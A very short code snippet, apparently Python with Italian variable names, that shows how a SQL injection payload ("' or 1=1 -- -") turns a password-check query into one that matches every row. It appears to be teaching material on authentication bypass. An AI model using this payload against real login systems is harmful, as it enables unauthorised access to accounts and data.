query = "SELECT * FROM login WHERE password = ciao "
payload = "ciao' or 1=1 -- -"

query_eseguita = "SELECT * FROM login WHERE password = 'ciao' or 1=1 -- -" #'